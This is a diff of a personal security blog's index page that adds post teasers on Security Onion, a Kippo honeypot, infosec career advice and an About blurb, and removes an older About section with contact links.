+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/security-onion-network-configuration-and-install/">Security Onion Network Configuration and Install</a>
+  </h1>
+  <time datetime="2013-10-19T02:41:57Z" class="post-date">Sat, Oct 19, 2013</time>
+  With apologies to The Onion
+  I&rsquo;ve played around with Security Onion in the past, but have never set up my network to capture or monitor traffic. And while installing Security Onion in a VM and only looking at only local or inter-VM traffic is quite interesting, especially if a person is playing around with Metasploit or something, I wanted to see all network traffic, including my other devices.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/security-onion-network-configuration-and-install/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/kippo-on-the-raspberry-pi/">Kippo on the Raspberry Pi</a>
+  </h1>
+  <time datetime="2013-05-07T01:43:15Z" class="post-date">Tue, May 7, 2013</time>
+  I recently bought a Raspberry Pi and installed Arch Linux ARM on it. I came across a rather amusing blog post of someone using the honeypot Kippo and thought what fun. See here to watch elite hackers and their mad skillz. That&rsquo;s the great thing about Kippo - it records user sessions for playback.
+Anyways, this post basically walks through what I did to get Kippo and kippo-graph up and running on my RPi.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/kippo-on-the-raspberry-pi/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/career-readme-txt/">Career README.txt</a>
+  </h1>
+  <time datetime="2013-04-04T00:50:49Z" class="post-date">Thu, Apr 4, 2013</time>
+  I read this article by Patrick McKenzie a while back, came across it again, and decided it&rsquo;s worth reading weekly. I&rsquo;ve pulled out some of his bolded points. But seriously, read the article in it&rsquo;s entirety. Again. And again.
+Don&rsquo;t Call Yourself a Programmer, And Other Career Advice
+ Modesty is not a career enhancing character trait
+ Network. In person.
+ Learn how to negotiate
+ Get good at Enterprise Sales
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/career-readme-txt/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/rob-fuller-on-getting-a-job-in-infosec/">Rob Fuller on Getting a Job in InfoSec</a>
+  </h1>
+  <time datetime="2013-02-22T01:12:37Z" class="post-date">Fri, Feb 22, 2013</time>
+  I was fortunate enough to get a good job in IT right out of college. Not in InfoSec, but in telecom, and in specific, service delivery. I&rsquo;m learning an incredible amount - from enterprise telephony environment to working in a highly complex work environment to leading delivery on new intent projects. But it&rsquo;s not InfoSec.
+In my search for ways to break into InfoSec, I&rsquo;ve come across numerous posts, advice, and tips to do just that.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/rob-fuller-on-getting-a-job-in-infosec/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/on-the-dumbest-ideas-in-computer-security/">On the Dumbest Ideas in Computer Security</a>
+  </h1>
+  <time datetime="2012-09-15T22:22:40Z" class="post-date">Sat, Sep 15, 2012</time>
+  The other day I came across an article by Marcus J Ranum on the six dumbest ideas in computer security which were very simple yet struck me as profound. I&rsquo;ll summarize them here for future reference.
+1) Default Permit
+Back when computer networks were still in their infancy, there were few avenues for attack. With those avenues turned off, all else was allowed. Hence &ldquo;default permit.&rdquo; Another area is code execution: anything clicked is permitted to run, unless stopped by antivirus or the likes.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/on-the-dumbest-ideas-in-computer-security/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/breaking-into-security/">Breaking into Security</a>
+  </h1>
+  <time datetime="2012-06-25T18:21:26Z" class="post-date">Mon, Jun 25, 2012</time>
+  This blogging thing is harder than it seems - the what to write, the time to write. I came across another interesting blog post from Krebs on Security, who interviewed Thomas Ptackek, founder of Matasano Security, on how to get into the field of computer security. As this is precisely my intent, I gave it a quick read through and thought to post a to-do for myself.
+ Learn how to program.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/breaking-into-security/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/random-ramblings/">My Random Ramblings</a>
+  </h1>
+  <time datetime="2012-01-04T21:12:53Z" class="post-date">Wed, Jan 4, 2012</time>
+  Here, shall I attempt to document some random doings related to computers, security, linuxstuff, windowsstuff, and most likely miscellany.
+Apparently typing all this out helps the mind become better at communicating, and who doesn&rsquo;t want that?
+So whether you or another read these ramblings, or I myself re-read them later on in my ever so awe-inspiring, galvanic, exhilarating life, let this be a place for learning and perusing.
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/about/">About</a>
+  </h1>
+  <time datetime="2012-01-01T00:00:00-0500" class="post-date">Sun, Jan 1, 2012</time>
+  I am a security professional with over seven years of experience and have held roles troubleshooting large networks and securing web and mobile applications. For the last three years I have been red teaming at several Fortune 500s across multiple industries.
+I have a strong track record of applying creative thinking and determination to solve technical challenges. I contribute to open source software including the Metasploit framework1 and enjoy sharing my technical learning experiences through this blog.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/about/">Read More…</a>
+  </div>
+  
+</article>
+</div>
+    </main>
 
     
-
-<p>I am a security professional with over five years of experience having held roles troubleshooting
-networks and securing applications. I have been red teaming at a large company for the past several years.</p>
-
-<p>I have a strong track record of applying creative thinking and determination to solve technical challenges.
-I contribute to open source software including the Metasploit framework<sup>1</sup> and enjoy sharing my
-technical learning experiences through this blog. I hold a few certificates including the OSCE and OSCP.</p>
-
-<p>I&rsquo;m always interested in challenging new opportunities.</p>
-
-<p>[1] <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/gather/jenkins_gather.rb">Jenkins Post Module</a></p>
-
-<h3 id="contact">Contact</h3>
-
-<p>Email: noah at this domain</p>
-
-<p>Twitter: <a href="https://twitter.com/thesubtlety">@thesubtlety</a></p>
-
-<p>Github: <a href="https://github.com/thesubtlety">https://github.com/thesubtlety</a></p>
-
-  </div>
-  
-</div>
-</div>
-
   </body>
 </html>
